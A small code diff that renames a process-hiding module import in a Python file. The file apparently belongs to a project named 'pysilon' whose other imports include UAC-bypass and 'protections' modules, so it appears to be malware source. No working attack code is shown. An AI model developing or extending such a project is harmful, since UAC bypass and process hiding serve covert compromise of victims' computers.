@@ -10,7 +10,7 @@ from urllib.request import urlopen
 import resources.modules.misc as pysilon_misc
 import resources.modules.info as pysilon_info
 import resources.modules.uac_bypass as uac_bypass
-import resources.modules.hideProcess as proc_hider
+import resources.modules.hide_process as proc_hider
 import resources.modules.protections as pysilon_protections
 
 def IsAdmin() -> bool:
